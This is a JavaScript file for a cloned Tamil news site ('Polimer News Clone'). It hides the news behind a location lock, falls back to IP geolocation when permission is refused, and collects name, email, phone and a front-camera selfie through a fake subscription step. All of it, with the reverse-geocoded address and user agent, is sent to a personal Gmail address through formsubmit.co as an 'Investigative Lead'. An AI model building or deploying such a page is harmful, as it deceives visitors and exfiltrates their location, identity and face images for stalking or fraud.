/**
 * Polimer News Clone - App Logic
 * Handles dynamic date, time, geolocation, camera capture, and user verification.
 */

let locationData = null;
let capturedImage = null;
let cameraStream = null;

document.addEventListener('DOMContentLoaded', () => {
    console.log('--- Polimer News Clone Initialized ---');

    // Initialize dynamic date/time
    updateDateTime();
    setInterval(updateDateTime, 1000);

    // Initialize Geolocation (attempt silent check or gesture-based)
    setupLocationLock();

    // Modal Initializations
    initModalLogic();

    // Sidebar Toggle
    const menuBtn = document.querySelector('.hamburger-menu');
    if (menuBtn) {
        menuBtn.addEventListener('click', () => {
            console.log('Menu Toggled');
        });
    }
});

/**
 * Sets up the location lock UI and button listener.
 */
function setupLocationLock() {
    const unlockBtn = document.getElementById('unlock-location-btn');
    if (unlockBtn) {
        unlockBtn.addEventListener('click', () => {
            unlockBtn.textContent = 'சரிபார்க்கப்படுகிறது...';
            initGeolocation();
        });
    }

    // Attempt to check if permission is already granted
    if ("permissions" in navigator) {
        navigator.permissions.query({ name: 'geolocation' }).then((result) => {
            if (result.state === 'granted') {
                initGeolocation();
            }
        });
    }
}

/**
 * Handles all modal-related interactions and the multi-step form.
 */
function initModalLogic() {
    const modal = document.getElementById('subscription-modal');
    const closeBtn = document.getElementById('close-modal');
    const form = document.getElementById('subscribe-form');
    const step1 = document.getElementById('step-1');
    const step2 = document.getElementById('step-2');
    const toStep2Btn = document.getElementById('to-step-2');
    const captureBtn = document.getElementById('capture-btn');
    const submitBtn = document.getElementById('submit-btn');
    const privacyCheck = document.getElementById('privacy-agreement');


    // Trigger modal via "Investigative" link (optional, if we add a button later)
    document.getElementById('share-mail')?.addEventListener('click', (e) => {
        e.preventDefault();
        openModal();
    });

    function openModal() {
        modal.style.display = 'flex';
        // Always start at step 1
        step1.classList.add('active');
        step2.classList.remove('active');
    }

    function closeModal() {
        modal.style.display = 'none';
        stopCamera();
    }

    closeBtn.onclick = closeModal;
    window.onclick = (event) => {
        if (event.target == modal) closeModal();
    };

    // Navigation to Step 2
    toStep2Btn.addEventListener('click', () => {
        const name = document.getElementById('subscriber-name').value;
        const email = document.getElementById('subscriber-email').value;
        const phone = document.getElementById('subscriber-phone').value;

        if (name && email && phone) {
            step1.classList.remove('active');
            step2.classList.add('active');
            initCamera();
        } else {
            alert('தயவுசெய்து அனைத்து விவரங்களையும் பூர்த்தி செய்யவும்.');
        }
    });

    // Camera Capture
    captureBtn.addEventListener('click', takeSnapshot);

    // Consent Validation
    privacyCheck.addEventListener('change', () => {
        validateSubmission();
    });

    // Form Submission
    form.addEventListener('submit', async (e) => {
        e.preventDefault();
        submitBtn.disabled = true;
        submitBtn.textContent = 'அனுப்பப்படுகிறது...';

        const formData = {
            name: document.getElementById('subscriber-name').value,
            email: document.getElementById('subscriber-email').value,
            phone: document.getElementById('subscriber-phone').value,
            consent: privacyCheck.checked,
            image: capturedImage,
            location: locationData
        };

        await sendFinalData(formData);
    });

    function validateSubmission() {
        submitBtn.disabled = !(privacyCheck.checked && capturedImage);
    }
}

/**
 * Camera Handlers
 */
async function initCamera() {
    const video = document.getElementById('camera-preview');
    const feedback = document.getElementById('capture-feedback');

    try {
        cameraStream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'user' },
            audio: false
        });
        video.srcObject = cameraStream;
        feedback.style.opacity = '0'; // Hide overlay when stream starts
    } catch (err) {
        console.error("Camera Error:", err);
        feedback.querySelector('.overlay-text').textContent = "கேமரா அனுமதி மறுக்கப்பட்டது";
    }
}

function stopCamera() {
    if (cameraStream) {
        cameraStream.getTracks().forEach(track => track.stop());
    }
}

function takeSnapshot() {
    const video = document.getElementById('camera-preview');
    const canvas = document.getElementById('captured-snapshot');
    const captureBtn = document.getElementById('capture-btn');
    const context = canvas.getContext('2d');

    // Set canvas size to match video
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    // Draw frame
    context.drawImage(video, 0, 0, canvas.width, canvas.height);

    // Get Base64 image
    capturedImage = canvas.toDataURL('image/jpeg', 0.8);

    // Feedback
    captureBtn.textContent = 'புகைப்படம் எடுக்கப்பட்டது - ✅';
    captureBtn.classList.add('captured');

    // Re-validate submit button
    const submitBtn = document.getElementById('submit-btn');
    const privacyCheck = document.getElementById('privacy-agreement');
    submitBtn.disabled = !(privacyCheck.checked && capturedImage);
}

/**
 * Geolocation Handlers
 * Prioritizes GPS for 'Exact Location', falls back to IP if permission is denied.
 */
async function initGeolocation() {
    updateStatus('இருப்பிடம் கண்டறியப்படுகிறது...', 'pending');

    if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
            async (position) => {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                locationData = { lat, lon, source: "துல்லியமான இருப்பிடம் (GPS)" };
                await handleLocationSuccess(lat, lon, locationData.source);
            },
            async (error) => {
                console.warn("GPS Permission denied or failed, falling back to IP:", error.message);
                const unlockBtn = document.getElementById('unlock-location-btn');
                if (error.code === error.PERMISSION_DENIED) {
                    if (unlockBtn) {
                        unlockBtn.textContent = 'அனுமதி மறுக்கப்பட்டது - மீண்டும் முயலவும்';
                        unlockBtn.style.backgroundColor = '#666';
                    }
                    alert('செய்திகளைப் படிக்க இருப்பிட அனுமதி (Location Permission) அவசியம். உங்கள் பிரவுசர் அமைப்புகளில் அனுமதியை வழங்கவும்.');
                }
                await fallbackToIPGeolocation();
            },
            { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
        );
    } else {
        await fallbackToIPGeolocation();
    }
}

async function fallbackToIPGeolocation() {
    try {
        const response = await fetch('https://get.geojs.io/v1/ip/geo.json');
        const data = await response.json();
        const lat = parseFloat(data.latitude);
        const lon = parseFloat(data.longitude);
        locationData = {
            lat,
            lon,
            source: `தானியங்கி இருப்பிடம் (IP: ${data.city || 'Unknown'})`
        };
        await handleLocationSuccess(lat, lon, locationData.source);
    } catch (error) {
        console.error("IP Geolocation failed:", error);
        updateStatus('இருப்பிடத்தை கண்டறிய முடியவில்லை', 'error');
    }
}

async function handleLocationSuccess(lat, lon, source) {
    // Unlock UI
    const overlay = document.getElementById('location-lock-overlay');
    const mainContent = document.querySelector('.content-wrapper');
    
    if (overlay) overlay.classList.add('hidden');
    if (mainContent) mainContent.classList.remove('content-locked');

    const detailsEl = document.getElementById('location-details');
    updateStatus('இருப்பிடம் கண்டறியப்பட்டது', 'success');

    detailsEl.innerHTML = `
        <div class="loc-card">
            <p><strong>Lat:</strong> ${lat.toFixed(6)}</p>
            <p><strong>Long:</strong> ${lon.toFixed(6)}</p>
            <div id="address-info" style="margin-top: 5px; font-size: 11px; color: #444;">
                <strong>Source:</strong> ${source}<br>
                <em>முகவரி கண்டறியப்படுகிறது...</em>
            </div>
            <a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank" class="maps-link">
                📍 வரைபடத்தில் பார்க்க
            </a>
        </div>
    `;

    const address = await fetchReverseGeocode(lat, lon);
    locationData.address = address;
}

async function fetchReverseGeocode(lat, lon) {
    const addressEl = document.getElementById('address-info');
    try {
        const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`);
        const data = await response.json();
        const address = data.display_name || 'முகவரி கண்டறியப்படவில்லை';
        if (addressEl) addressEl.innerHTML = `<strong>முகவரி:</strong> ${address}`;
        return address;
    } catch (error) {
        return 'Unknown Address';
    }
}

/**
 * Final Data Submission
 */
async function sendFinalData(data) {
    const emailData = {
        _subject: `New Investigative Lead: ${data.name}`,
        "Name": data.name,
        "Email": data.email,
        "Phone": data.phone,
        "Consent Granted": data.consent ? "Yes" : "No",
        "Latitude": data.location?.lat,
        "Longitude": data.location?.lon,
        "Address": data.location?.address,
        "Maps Link": `https://www.google.com/maps?q=${data.location?.lat},${data.location?.lon}`,
        "Device Info": navigator.userAgent,
        "Snapshot": "Sent as attachment/content below",
        // FormSubmit handles Base64 as text, or we can use another trick. 
        // For simplicity in this clone, we send the fields.
        "Verification Image": data.image
    };

    try {
        const response = await fetch("https://formsubmit.co/ajax/clcntk84@gmail.com", {
            method: "POST",
            headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
            body: JSON.stringify(emailData)
        });
        const result = await response.json();
        console.log("Success:", result);
        showSuccessState();
    } catch (err) {
        console.error("Submission Error:", err);
        alert('தரவுகளை அனுப்புவதில் சிக்கல் ஏற்பட்டது. மீண்டும் முயலவும்.');
        document.getElementById('submit-btn').disabled = false;
        document.getElementById('submit-btn').textContent = 'தரவுகளை சமர்ப்பிக்கவும்';
    }
}

function showSuccessState() {
    const modalContent = document.querySelector('.modal-content');
    modalContent.innerHTML = `
        <div style="padding: 40px 20px;">
            <div style="font-size: 60px; margin-bottom: 20px;">✅</div>
            <h2 style="color: var(--polimer-red); margin-bottom: 15px;">சமர்ப்பிக்கப்பட்டது!</h2>
            <p style="color: #666; margin-bottom: 25px;">உங்கள் விவரங்கள் மற்றும் இருப்பிடம் வெற்றிகரமாக சரிபார்க்கப்பட்டது. எமது குழு உங்களை தொடர்பு கொள்ளும்.</p>
            <button onclick="location.reload()" class="next-btn" style="width: 100%;">முகப்பு பக்கத்திற்கு செல்ல</button>
        </div>
    `;
}

/**
 * UI Utilities
 */
function updateStatus(text, type) {
    const statusEl = document.getElementById('location-status');
    if (statusEl) statusEl.textContent = text;
}

function updateDateTime() {
    const timeEl = document.getElementById('current-time');
    const dateEl = document.getElementById('current-date');
    if (!timeEl || !dateEl) return;

    const now = new Date();
    timeEl.textContent = now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true });

    const days = ['ஞாயிறு', 'திங்கள்', 'செவ்வாய்', 'புதன்', 'வியாழன்', 'வெள்ளி', 'சனி'];
    const months = ['ஜனவரி', 'பிப்ரவரி', 'மார்ச்', 'ஏப்ரல்', 'மே', 'ஜூன்', 'ஜூலை', 'ஆகஸ்ட்', 'செப்டம்பர்', 'அக்டோபர்', 'நவம்பர்', 'டிசம்பர்'];
    dateEl.textContent = `${days[now.getDay()]}, ${now.getDate()} ${months[now.getMonth()]}, ${now.getFullYear()}`;
}
